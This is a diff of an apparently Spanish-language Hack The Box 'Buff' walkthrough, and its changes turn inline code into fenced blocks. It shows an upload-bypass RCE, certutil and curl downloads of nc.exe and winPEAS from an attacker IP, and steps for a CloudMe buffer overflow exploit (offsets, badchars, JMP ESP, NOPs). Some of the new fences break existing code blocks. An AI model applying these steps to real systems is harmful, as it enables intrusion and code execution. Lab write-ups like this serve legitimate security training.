@@ -112,14 +112,26 @@ Analyzamos el script y lo comprobamos con firefox al mismo tiempo:
 
 1. Ir a la pagina /upload.php que no mirra para una session de usuario authentificado
 
-    - `http://10.10.10.198:8080/upload.php` Nos pone undefined id parameter.
+    - 
+```bash
+ http://10.10.10.198:8080/upload.php 
+```
+ Nos pone undefined id parameter.
 
 1. Ponerle un parametro id en la GET request que appunte en el fichero deseado
 
-    - `http://10.10.10.198:8080/upload.php?id=EEEE` nos hace algo.
+    - 
+```bash
+ http://10.10.10.198:8080/upload.php?id=EEEE 
+```
+ nos hace algo.
 
 1. Bypasseamos un archivo con una doble extension. (.php.png)
-1. Bypasseamos el type check modificando el **Content-type** del fichero con `image/png`
+1. Bypasseamos el type check modificando el **Content-type** del fichero con 
+```bash
+ image/png 
+```
+
 1. Se pone un codigo malicioso en el body del fichero
 
 Estos passos se pueden facilmente hacer a mano pero aqui vamos a utilizar el proprio exploit.
@@ -159,7 +171,11 @@ curl http://10.10.14.8/nc.exe -o nc.exe
 ```
 
 
-Si le hacemos un type `C:\users\shaun\Desktop\user.txt` podemos ver la flag.
+Si le hacemos un type 
+```bash
+ C:\users\shaun\Desktop\user.txt 
+```
+ podemos ver la flag.
 
 ### Analyzando la maquina {-}
 
@@ -180,7 +196,11 @@ mkdir EEEE
 cd EEEE
 ```
 
-Descargamos el `winpeasx64.exe` desde [https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).
+Descargamos el 
+```bash
+ winpeasx64.exe 
+```
+ desde [https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).
 
 ```bash
 cd content
@@ -195,21 +215,45 @@ certutil.exe -f -urlcache -split http://10.10.14.8/winPEASexe.exe winPEAS.exe
 winPEAS.exe
 ```
 
-En la parte `Searching executable files in non-default folders with write (equivalent) permissions` vemos que
-el ususario shaun tiene AllAccess al ejecutable `C:\Users\shaun\Downloads\CloudMe_1112.exe`. Mirando por internet 
-vemos que CloudMe es un servico que occupa el puerto **8888**. Lo comprobamos con `netstat`
+En la parte 
+```bash
+ Searching executable files in non-default folders with write (equivalent) permissions 
+```
+ vemos que
+el ususario shaun tiene AllAccess al ejecutable 
+```bash
+ C:\Users\shaun\Downloads\CloudMe_1112.exe 
+```
+. Mirando por internet 
+vemos que CloudMe es un servico que occupa el puerto **8888**. Lo comprobamos con 
+```bash
+ netstat 
+```
+
 
 A demas buscamos con searchsploit y vemos que este binario es vulnerable a un BufferOverflow.
 
 ## BufferOverflow {-}
 
 Aqui vamos a trabajar principalmente en la maquina windows. Analizando el exploit del BufferOverflow que nos da
-searchsploit vemos que podemos descargarnos el binario `CloudMe_1112.exe` en el link `https://www.cloudme.com/downloads/CloudMe_1112.exe`.
+searchsploit vemos que podemos descargarnos el binario 
+```bash
+ CloudMe_1112.exe 
+```
+ en el link 
+```bash
+ https://www.cloudme.com/downloads/CloudMe_1112.exe 
+```
+.
 Lo descargamos en la maquina Windows y lo installamos. La installacion es la typica de windows (next, next, next...).
 
 Nos tenemos que crear un usuario y iniciar una session.
 
-Una vez el programma lanzado, podemos comprobar que el servicio corre abriendo un cmd y lanzando el commando `netstat -nat`. Aqui vemos
+Una vez el programma lanzado, podemos comprobar que el servicio corre abriendo un cmd y lanzando el commando 
+```bash
+ netstat -nat 
+```
+. Aqui vemos
 que el puerto 8888 esta corriendo.
 
 En esta situacion hay que entender que nosotros vamos a utilizar nuestra propria maquina windows como maquina de test. todo los passos siguientes
@@ -389,9 +433,17 @@ if __name__ == "__main__":
 ```
 
 Una vez mas tenemos que lanzar el CloudMe porque previamente a petado. Tambien tenemos nuevamente que attachear al Immunity Debugger el servicio CloudMe.
-Lanzamos el script y vemos que el valor del EIP vale `316A4230`
+Lanzamos el script y vemos que el valor del EIP vale 
+```bash
+ 316A4230 
+```
 
-Con la herramienta `pattern_offset` podemos comprovar cuantas **A** tengo que meter antes de sobre escribir la EIP
+
+Con la herramienta 
+```bash
+ pattern_offset 
+```
+ podemos comprovar cuantas **A** tengo que meter antes de sobre escribir la EIP
 
 ```bash
 /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230
@@ -443,7 +495,11 @@ del EIP. Ahora la pregunta es, que tiene que valer el EIP para poderle injectar 
 que el **ESP** contiene un monton de **C**. el ESP es la Stack. Si le hacemos un click derecho a la direccion y les damos a **Follow in Dumb**, 
 en la parte baja de la izquierda vemos todas la **C** en formato raw.
 
-Al final aqui la direccion a la cual tenemos que appuntar es a la **ESP** `0x0022D470` que es la pilla. El problema es que no podemos simplemente ponerle al
+Al final aqui la direccion a la cual tenemos que appuntar es a la **ESP** 
+```bash
+ 0x0022D470 
+```
+ que es la pilla. El problema es que no podemos simplemente ponerle al
 EIP la direccion del ESP porque esto no va a funccionar. Tendremos aqui que usar un concepto que se llama **OPCODE**. El **OPCODE** son instrucciones
 a bajo nivel que nos permitte hacer un Jump al ESP llamado **JMPESP**.
 
@@ -459,7 +515,11 @@ Tenemos que empezar por buscar estos **BadChars**.
 
     A bajo de la ventana del Immunity Debugger, podemos entrar commandos. Aqui creamos un directorio para poder trabajar correctamente
 
-    - `!mona config -set workingfolder C:\Users\S4vitar\Desktop\%p`
+    - 
+```bash
+ !mona config -set workingfolder C:\Users\S4vitar\Desktop\%p 
+```
+
 
     ```{r, echo = FALSE, fig.cap="Mona Set working directory", out.width="90%"}
         knitr::include_graphics("images/Buff-mona_set_wdir.png")
@@ -469,7 +529,11 @@ Tenemos que empezar por buscar estos **BadChars**.
 
     ```bash
     !mona bytearray -cpb "\x00"
-    quittamos de entrada el caracter `x00` que es un **BadChars** bastante commun.
+    quittamos de entrada el caracter 
+```bash
+ x00 
+```
+ que es un **BadChars** bastante commun.
 ![Buff-moa_set_wdir](/assets/images/Buff-mona_set_wdir.png) 
 
 1. Enviamos todos estos caracteres en la pila para ver en que punto, o mejor dicho que carateres hacen quel programa pete.
@@ -610,7 +674,11 @@ Aqui lo que tenemos que hacer es encontrar una direccion donde se ejecute el com
     knitr::include_graphics("images/Buff-protection_false.png")
     ```
 
-1. Buscar el opcode (en este caso `ff e4`) en la dll.
+1. Buscar el opcode (en este caso 
+```bash
+ ff e4 
+```
+) en la dll.
 
     ```bash
     !mona find -s "\xff\xe4" -m Qt5Core.dll
@@ -675,9 +743,17 @@ Aqui hay que tener en cuenta el echo que nuestra shell code esta cifrada y que t
 el codigo nos salte al ESP tenga tiempo para desencryptar el codigo. Para esto tenemos dos possibilidades.
 
 - Añdir al shell code unos No Operation code **NOPS**
-- Effectuar un desplazamiento de la pila con la instruccion `sub esp, 0x10`
+- Effectuar un desplazamiento de la pila con la instruccion 
+```bash
+ sub esp, 0x10 
+```
 
-Que simplemente es, en el caso de las NOPS, añadir codigo que no hace nada. Se hacen con el caracter Hexadecimal `\x90`
+
+Que simplemente es, en el caso de las NOPS, añadir codigo que no hace nada. Se hacen con el caracter Hexadecimal 
+```bash
+ \x90 
+```
+
 
 ```python
  #!/usr/bin/python3
